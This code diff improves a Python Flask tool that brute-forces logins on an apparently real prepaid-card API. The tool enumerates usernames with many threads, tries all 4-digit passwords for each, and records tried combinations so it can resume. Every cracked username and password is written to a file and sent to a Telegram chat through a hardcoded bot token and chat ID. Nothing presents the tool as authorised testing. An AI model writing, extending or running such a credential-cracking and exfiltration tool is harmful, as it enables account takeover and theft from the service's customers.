@@ -12,12 +12,12 @@ app = Flask(__name__)
 # Global variables to track progress
 current_step = "Initializing"
 valid_usernames = [] # Usernames found to be valid for password attempts
+tried_passwords = {} # Dictionary: username -> set of passwords tried for this username
 current_username = "" # The username currently being processed for passwords
 total_requests = 0 # Total requests for the *current* operation (username scan batch or password batch)
 processed_requests = 0 # Processed requests for the *current* operation
 is_running = False
-# success_info will hold successful attempts in memory
-success_info = []
+success_info = [] # Global list holding successful attempts
 
 # Configuration
 API_URL = "https://bc.red-radius.com/api/v1/prepaid-cards"
@@ -28,66 +28,103 @@ SUCCESS_FILE = "successes.json" # File to save successful attempts
 
 # Telegram Configuration
 BOT_TOKEN = "5540358750:AAEbbNLxeyj3IwAn90Jumy5C5a1qTbTzzM"
-# The chat ID is the ID of the user you want to send the message to.
-# From your provided JSON, the 'chat.id' is 962451110.
 CHAT_ID = "962451110"
 
-# --- State Management for Valid Usernames ---
+# --- State Management (Valid Usernames & Tried Passwords) ---
 def load_state():
-    if os.path.exists(STATE_FILE):
-        with open(STATE_FILE, 'r') as f:
-            try:
+    """Loads valid usernames and tried passwords from the state file."""
+    if os.path.exists(STATE_FILE) and os.path.getsize(STATE_FILE) > 0:
+        try:
+            with open(STATE_FILE, 'r') as f:
                 state = json.load(f)
-                # Return the list of valid usernames
-                return state.get("valid_usernames", [])
-            except json.JSONDecodeError:
-                print(f"Warning: Could not decode JSON from {STATE_FILE}. Starting username state fresh.")
-                return []
-    return []
+                loaded_usernames = state.get("valid_usernames", [])
+                loaded_tried_passwords = {}
+                # Convert lists of passwords back to sets
+                for user, passwords_list in state.get("tried_passwords", {}).items():
+                    loaded_tried_passwords[user] = set(passwords_list)
+                print(f"Loaded state from {STATE_FILE}")
+                return loaded_usernames, loaded_tried_passwords
+        except json.JSONDecodeError as e:
+            print(f"Warning: Could not decode JSON from {STATE_FILE}: {e}. Starting state fresh.")
+            return [], {}
+        except Exception as e:
+             print(f"Error loading state from {STATE_FILE}: {e}. Starting state fresh.")
+             return [], {}
+    print(f"State file {STATE_FILE} not found or is empty. Starting state fresh.")
+    return [], {}
 
-def save_state(valid_usernames):
-    # Only save the list of valid usernames
-    state = {"valid_usernames": valid_usernames}
-    with open(STATE_FILE, 'w') as f:
-        json.dump(state, f, indent=4)
+def save_state():
+    """Saves valid usernames and tried passwords to the state file."""
+    # Convert sets of passwords to lists for JSON serialization
+    serializable_tried_passwords = {}
+    for user, passwords_set in tried_passwords.items():
+        serializable_tried_passwords[user] = list(passwords_set)
+
+    state = {
+        "valid_usernames": valid_usernames,
+        "tried_passwords": serializable_tried_passwords
+    }
+    try:
+        with open(STATE_FILE, 'w') as f:
+            json.dump(state, f, indent=4)
+        # print(f"State saved to {STATE_FILE}") # Optional: log every save
+    except Exception as e:
+        print(f"Error saving state to {STATE_FILE}: {e}")
+
 
 # --- State Management for Successes ---
 def load_successes():
+    """Loads successful attempts from the successes file."""
     if os.path.exists(SUCCESS_FILE) and os.path.getsize(SUCCESS_FILE) > 0:
         try:
             with open(SUCCESS_FILE, 'r') as f:
-                return json.load(f)
-        except json.JSONDecodeError:
-            print(f"Warning: Could not decode JSON from {SUCCESS_FILE}. Starting successes fresh.")
+                successes = json.load(f)
+                print(f"Loaded {len(successes)} successes from {SUCCESS_FILE}")
+                return successes
+        except json.JSONDecodeError as e:
+            print(f"Warning: Could not decode JSON from {SUCCESS_FILE}: {e}. Starting successes fresh.")
             return []
+        except Exception as e:
+             print(f"Error loading successes from {SUCCESS_FILE}: {e}. Starting successes fresh.")
+             return []
+    print(f"Successes file {SUCCESS_FILE} not found or is empty. Starting successes fresh.")
     return []
 
 def save_success(success_entry):
-    """Appends a new success entry to the successes file."""
+    """Appends a new success entry to the successes file and global list."""
     global success_info # Access the global list
     # Add to the in-memory list if it's not already there (handle potential duplicates if re-loading state)
     if not any(s['username'] == success_entry['username'] and s['password'] == success_entry['password'] for s in success_info):
         success_info.append(success_entry)
+        try:
+            # Save the entire updated list to the file
+            with open(SUCCESS_FILE, 'w') as f:
+                json.dump(success_info, f, indent=4)
+            print(f"Saved success for {success_entry['username']}/{success_entry['password']} to {SUCCESS_FILE}")
+        except Exception as e:
+            print(f"Error saving successes to file {SUCCESS_FILE}: {e}")
+    # Else: It's already in memory/file, do nothing
 
-    try:
-        # Save the entire updated list to the file
-        with open(SUCCESS_FILE, 'w') as f:
-            json.dump(success_info, f, indent=4)
-    except Exception as e:
-        print(f"Error saving successes to file: {e}")
 
 # --- Telegram Notification Function ---
 def send_telegram_success_notification(success_entry):
     """Sends a success notification to the configured Telegram chat."""
+    # Escape special characters for MarkdownV2: _, *, [, ], (, ), ~, `, >, #, +, -, =, |, {, }, ., !
+    def escape_markdown_v2(text):
+        if not isinstance(text, str):
+            text = str(text)
+        escape_chars = r'_*[]()~`>#+-=|{}.!'
+        return ''.join('\\' + char if char in escape_chars else char for char in text)
+
     message_text = f"""
 🎉 Bruteforce Success Found! 🎉
 
-*Username*: `{success_entry.get('username', 'N/A')}`
-*Password*: `{success_entry.get('password', 'N/A')}`
-*Status*: `{success_entry.get('status', 'N/A')}`
-*Duration*: `{success_entry.get('duration', 'N/A')}`
-*Remaining*: `{success_entry.get('remaining', 'N/A')}`
-*Timestamp*: `{success_entry.get('timestamp', 'N/A')}`
+*Username*: `{escape_markdown_v2(success_entry.get('username', 'N/A'))}`
+*Password*: `{escape_markdown_v2(success_entry.get('password', 'N/A'))}`
+*Status*: `{escape_markdown_v2(success_entry.get('status', 'N/A'))}`
+*Duration*: `{escape_markdown_v2(success_entry.get('duration', 'N/A'))}`
+*Remaining*: `{escape_markdown_v2(success_entry.get('remaining', 'N/A'))}`
+*Timestamp*: `{escape_markdown_v2(success_entry.get('timestamp', 'N/A'))}`
 """
     telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
@@ -96,9 +133,10 @@ def send_telegram_success_notification(success_entry):
         "parse_mode": "MarkdownV2" # Use MarkdownV2 for formatting
     }
     try:
+        # Use a separate, non-blocking request if possible, or a small timeout
         response = requests.post(telegram_url, json=payload, timeout=10)
         response.raise_for_status() # Raise an HTTPError for bad responses (4xx or 5xx)
-        print(f"Telegram notification sent successfully for {success_entry['username']}")
+        # print(f"Telegram notification sent successfully for {success_entry['username']}") # Optional: log every notification
     except requests.exceptions.RequestException as e:
         print(f"Error sending Telegram notification for {success_entry.get('username', 'N/A')}: {e}")
     except Exception as e:
@@ -119,41 +157,50 @@ def send_request(payload):
         return response.json(), payload
     except requests.exceptions.RequestException as e:
         # Catch specific requests exceptions for better error handling
-        # print(f"Request failed for payload {payload}: {e}") # Optional: log all request failures
-        return {"error": str(e), "message": "Request failed"}, payload # Return a structured error response
+        error_message = str(e)
+        print(f"Request failed for payload {payload}: {error_message}")
+        return {"error": error_message, "message": "Request failed"}, payload # Return a structured error response
     except Exception as e:
         # Catch any other unexpected errors
-        print(f"An unexpected error occurred during request for payload {payload}: {e}")
-        return {"error": str(e), "message": "Unexpected error"}, payload
+        error_message = str(e)
+        print(f"An unexpected error occurred during request for payload {payload}: {error_message}")
+        return {"error": error_message, "message": "Unexpected error"}, payload
 
 
 # --- Password Brute-forcing Logic (Modified) ---
 def try_passwords_batch(username, start_idx):
     """
-    Tries all 1000 passwords within the range starting at start_idx.
-    Passwords are 4 digits, 0000-9999.
-    start_idx will be 0, 1000, 2000, ..., 9000.
-    This function will test start_idx, start_idx+1, ..., start_idx+999.
+    Tries all 1000 passwords within the range starting at start_idx,
+    skipping those already marked as tried.
     """
-    global current_step, processed_requests, total_requests, success_info
+    global current_step, processed_requests, total_requests, success_info, tried_passwords
 
     # Passwords to try in this batch (all 1000 in the 1000-range)
     password_attempts = [str(i).zfill(4)
-                         for i in range(start_idx, min(start_idx + 1000, 10000))] # <-- CHANGED '10' to '1000'
+                         for i in range(start_idx, min(start_idx + 1000, 10000))]
 
-    total_requests = len(password_attempts) # This will now be 1000 (or less for the last batch)
+    # Filter out passwords that have already been tried for this username
+    passwords_to_send = [p for p in password_attempts
+                         if username not in tried_passwords or p not in tried_passwords[username]]
+
+    total_requests = len(passwords_to_send) # Total requests is now only the ones we haven't tried
     processed_requests = 0
 
-    # Update step description to reflect the larger batch size
-    current_step = f"🔐 Trying passwords {start_idx:04d} - {min(start_idx + 999, 9999):04d} for: {username}" # <-- Updated description
+    current_step = f"🔐 Trying passwords {start_idx:04d} - {min(start_idx + 999, 9999):04d} for: {username} ({len(passwords_to_send)} new attempts)"
     print(current_step)
 
-    for password in password_attempts:
+    if not passwords_to_send:
+        print(f"All passwords in range {start_idx:04d}-{min(start_idx + 999, 9999):04d} for {username} already tried. Skipping batch.")
+        return False # No new passwords to try in this batch
+
+    for password in passwords_to_send:
         payload = {"username": username, "password": password}
+
         result, sent_payload = send_request(payload)
         processed_requests += 1
 
         # Check for success message (or absence of known error message)
+        # Assuming success is indicated by a message *not* being the specific error or a request error
         if result and result.get("message") not in ["خطأ في إسم المستخدم أو كلمة المرور", "Request failed", "Unexpected error"]:
              # Success found!
              success_entry = {
@@ -165,28 +212,48 @@ def try_passwords_batch(username, start_idx):
                  "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
              }
 
+             # --- Send Telegram Notification ---
              send_telegram_success_notification(success_entry)
-             save_success(success_entry)
+             # ------------------------------------
+
+             save_success(success_entry) # Save to file and update in-memory list
              current_step = f"🎉 SUCCESS found for {username} with password {password}!"
              print(current_step)
+
+             # Save state immediately after a success to record tried passwords up to this point
+             # before potentially moving to the next user or stopping.
+             save_state()
              return True # Indicate success, move to next username
 
+        # If the request failed or returned the specific "incorrect password" message,
+        # mark this combination as tried.
+        elif result and (result.get("message") == "خطأ في إسم المستخدم أو كلمة المرور" or "error" in result):
+            tried_passwords.setdefault(username, set()).add(password)
+            # Optional: print failed attempts if needed for debugging
+            # print(f"Failed/Error for {username}/{password}. Marked as tried.")
+
+
     # If loop finishes without finding success in this 1000-password batch
+    # Save state after trying a full batch for a user (even if no success in this batch)
+    # This saves the newly added failed attempts for this batch.
+    save_state() # Save after a batch is complete
     return False
 
 
 # --- Background Processing Thread ---
 def background_process():
-    global current_step, valid_usernames, total_requests, processed_requests, is_running, current_username, success_info
+    global current_step, valid_usernames, total_requests, processed_requests, is_running, current_username, success_info, tried_passwords
 
     # Load existing state and successes on startup
-    valid_usernames.extend(load_state()) # Add loaded usernames to current list
+    loaded_usernames, loaded_tried_passwords = load_state()
+    valid_usernames.extend(loaded_usernames) # Add loaded usernames to current list
+    tried_passwords.update(loaded_tried_passwords) # Merge loaded tried passwords
 
-    # Initialize success_info global by loading the file
-    success_info.extend(load_successes())
+    success_info.extend(load_successes()) # Add loaded successes to current list
 
     print("Background process started.")
     print(f"Loaded {len(valid_usernames)} valid usernames from state.")
+    print(f"Loaded {sum(len(p) for p in tried_passwords.values())} tried password attempts from state.")
     print(f"Loaded {len(success_info)} successes from file.")
 
 
@@ -205,8 +272,7 @@ def background_process():
                 newly_found_valid_usernames_count = 0
 
                 # Using ThreadPoolExecutor for scanning
-                # Max workers potentially reduced slightly if API has strict rate limits
-                with ThreadPoolExecutor(max_workers=30) as executor:
+                with ThreadPoolExecutor(max_workers=30) as executor: # Adjusted max_workers
                     futures = {executor.submit(send_request, payload): payload for payload in payloads}
 
                     for future in as_completed(futures):
@@ -219,7 +285,7 @@ def background_process():
                                 username = payload["username"]
                                 if username not in valid_usernames: # Avoid duplicates
                                      valid_usernames.append(username)
-                                     newly_found_valid_usernames_count += 1 # Track newly found for saving
+                                     newly_found_valid_usernames_count += 1 # Track newly found
                                      # print(f"Valid username candidate found: {username}") # Optional: print candidates
 
                         except Exception as e:
@@ -227,7 +293,7 @@ def background_process():
 
                 # Save state if new valid usernames were found
                 if newly_found_valid_usernames_count > 0:
-                     save_state(valid_usernames) # Save all valid usernames found so far
+                     save_state() # Save the updated valid usernames list and tried passwords
                      current_step = f"✅ Found {newly_found_valid_usernames_count} new valid usernames. Total: {len(valid_usernames)}"
                      print(current_step)
                 else:
@@ -237,42 +303,61 @@ def background_process():
 
                 # --- Phase 2: Try passwords for discovered valid usernames ---
                 # Iterate through the list of valid usernames.
-                # Use a copy [:] to iterate in case the list is modified elsewhere (though unlikely here)
-                for username in valid_usernames[:]: # Iterate over a copy
+                # Use a copy [:] to iterate in case the list is modified elsewhere (unlikely, but safe)
+                # Iterate through valid usernames starting from the beginning of the list each cycle.
+                for username in valid_usernames[:]:
                     current_username = username
                     # Check if this username already has a success entry in the global list
                     if any(s['username'] == username for s in success_info):
                          # print(f"Skipping username {username}, success already found.")
                          continue # Skip if already successful
 
-                    current_step = f"🔐 Starting password attempts for: {username}"
-                    print(current_step)
-
                     # Iterate through password ranges (0-999, 1000-1999, ..., 9000-9999)
-                    # try_passwords_batch will only test the first 10 in each range
+                    # try_passwords_batch will try passwords within the range that haven't been marked as tried
                     success_for_user_found = False
                     for start_idx in range(0, 10000, 1000):
-                        if try_passwords_batch(username, start_idx):
+                         # Check if *any* passwords in this batch range (start_idx to start_idx+999)
+                         # *could* potentially be tried (i.e., not all 1000 are already marked as tried)
+                         batch_range = range(start_idx, min(start_idx + 1000, 10000))
+                         all_in_batch_tried = all(
+                             str(i).zfill(4) in tried_passwords.get(username, set())
+                             for i in batch_range
+                         )
+
+                         if all_in_batch_tried:
+                            # print(f"All passwords in range {start_idx:04d}-{min(start_idx + 999, 9999):04d} for {username} already tried. Skipping range.")
+                            continue # Skip this password batch range entirely
+
+                        # If there are potentially untried passwords in this batch range, try them
+                         if try_passwords_batch(username, start_idx):
                             success_for_user_found = True
                             break # Success found for this username, move to the next valid username
 
-                        # If no success in this batch (10 attempts), wait before the next batch (next 1000 range)
-                        # print(f"No success in batch {start_idx:04d}-{min(start_idx + 9, 9999):04d} for {username}. Waiting 60s.")
+                        # If no success in this batch (up to 1000 attempts), wait before the next batch (next 1000 range)
+                        # print(f"No success in batch {start_idx:04d}-{min(start_idx + 999, 9999):04d} for {username}. Waiting 60s before next range.")
                         current_step = f"🛌 Waiting 60s before trying next batch ({start_idx+1000:04d}-...) for {username}"
                         time.sleep(60)
 
+
                     if not success_for_user_found:
-                         print(f"Finished all password ranges for {username} without success in this run.")
+                         print(f"Finished all password ranges for {username} without success in this run or all possible passwords tried.")
+                    # Important: Save state after processing each user if needed,
+                    # but try_passwords_batch already saves after each batch of 1000 and on success.
+                    # An additional save here might be redundant but adds robustness.
+                    # save_state()
 
 
                 current_step = "😴 Sleeping before next scan cycle..."
                 print(current_step)
-                time.sleep(600) # Sleep longer between full cycles of scanning/checking usernames
+                save_state() # Final state save before a longer sleep
+                time.sleep(600) # Sleep longer between full cycles
 
 
             except Exception as e:
                 current_step = f"Fatal Error in background process: {str(e)}"
                 print(current_step)
+                # Save state on error might help recover progress
+                save_state()
                 # Avoid tight loop on error
                 time.sleep(60)
         else:
@@ -283,8 +368,7 @@ def background_process():
 # --- Flask Routes ---
 @app.route('/')
 def home():
-    # The global variables valid_usernames and success_info are kept updated by the background thread.
-    # Initial render values will be updated by JS status calls.
+    # The global variables are updated by the background thread.
     return render_template(
         'index.html',
         current_step=current_step,
@@ -313,9 +397,12 @@ def get_success_file():
 @app.route('/status')
 def status():
     """Endpoint to get current status and data as JSON for UI updates."""
+    # Calculate total number of tried passwords across all users for display? Optional.
+    total_tried_count = sum(len(p) for p in tried_passwords.values())
     return jsonify({
         'current_step': current_step,
         'valid_usernames': valid_usernames,
+        'total_tried_passwords_count': total_tried_count, # Optional: include count
         'current_username': current_username,
         'progress': (processed_requests / total_requests * 100) if total_requests > 0 else 0,
         'is_running': is_running,
@@ -327,14 +414,11 @@ def toggle():
     """Endpoint to start or stop the background process."""
     global is_running
     is_running = not is_running
-    # Update current_step immediately to reflect the change
     if is_running:
         current_step = "▶️ Process is starting..."
-        print(current_step)
     else:
         current_step = "⏸️ Process is stopping..."
-        print(current_step)
-
+    print(current_step) # Log the change
     return jsonify({'is_running': is_running})
 
 # --- Main Execution ---
